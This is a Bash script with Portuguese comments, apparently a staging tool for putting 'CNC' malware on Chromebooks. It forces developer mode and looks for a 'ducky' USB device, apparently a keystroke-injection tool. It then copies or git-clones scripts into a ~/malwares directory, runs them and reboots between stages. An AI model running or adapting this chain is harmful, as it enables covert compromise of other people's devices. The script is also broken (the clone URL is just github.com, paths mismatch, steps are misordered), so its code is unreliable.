#!/bin/bash

#Antes de iniciar:
# chmod +x CNC_chrome.sh

# Função para habilitar o modo de desenvolvedor no Chromebook
habilitar_modo_desenvolvedor() {
  if [ ! -f "/tmp/mode_dev_enabled" ]; then
    echo "Habilitando o modo de desenvolvedor..."
    sudo chromeos-firmwareupdate --mode=todev || {
      echo "O comando para habilitar o modo de desenvolvedor não foi aceito."
      echo "Por favor, siga o procedimento abaixo para habilitar o modo de desenvolvedor manualmente:"
      echo
      echo "1. Desligue o Chromebook."
      echo "2. Pressione e segure as teclas Esc + Refresh (normalmente é a quarta tecla na fileira superior com uma seta circular) no teclado."
      echo "3. Enquanto mantém essas teclas pressionadas, pressione o botão de ligar para ligar o Chromebook."
      echo "4. Solte as teclas quando você ver a tela de recuperação."
      echo "5. A partir daqui, use as teclas de seta para navegar até as opções avançadas e pressione Enter."
      echo "6. Na próxima tela, selecione 'Enable Developer Mode' e pressione Enter."
      echo "7. Na última tela, pressione 'Confirm'."
      echo
      read -n 1 -s -r -p "Pressione qualquer tecla quando terminar o procedimento de habilitação do modo de desenvolvedor..."
      echo
    }
    sudo touch "/tmp/mode_dev_enabled"
    sudo shutdown now
    exit 0
  fi
}

# Função para verificar se o pendrive "ducky" está conectado
detectar_pendrive_ducky() {
  if ls /media/removable/ducky* 1> /dev/null 2>&1; then
    echo "Pendrive 'ducky' encontrado."
    return 0
  else
    echo "Pendrive 'ducky' não encontrado."
    return 1
  fi
}

# Função para fazer o clone do repositório do Git
git_clone_repositorio() {
  echo "Clonando repositório 'https://www.github.com/'..."
  cd ~
  git clone https://www.github.com
  chmod +x ~/malwares/tools/CNC/CNC.sh
  sudo touch "/tmp/git_clonado"
  sudo reboot
  exit 0
}

# Função para montar o pendrive e copiar os scripts para o Chromebook
copiar_scripts_pendrive() {
  if [ ! -f "/tmp/scripts_copiados" ]; then
    echo "Montando o pendrive..."
    PENDRIVE_DIR="/media/removable/$(ls /media/removable/)"
    mkdir -p ~/scripts
    cp "$PENDRIVE_DIR/CNC.sh" ~/scripts/
    chmod +x ~/scripts/CNC.sh
    sudo touch "/tmp/scripts_copiados"
    sudo reboot
    exit 0
  fi
}

# Função para executar o script CNC.sh
executar_script_tunnel_local() {
  echo "Executando o script CNC.sh..."
  ~/scripts/CNC.sh
}

# Verificar se o pendrive "ducky" está conectado
detectar_pendrive_ducky
if [ $? -eq 0 ]; then
  copiar_scripts_pendrive
else
  # Verificar se o repositório do Git já foi clonado
  if [ ! -f "/tmp/git_clonado" ]; then
    git_clone_repositorio
  else
    executar_script_tunnel_local
  fi
fi

# Execução das funções
habilitar_modo_desenvolvedor

# Executar o script start_chromeos.sh
echo "Executando o script start_chromeos.sh..."
chmod +x ~/malwares/tools/start_chromeos.sh
~/malwares/tools/start_chromeos.sh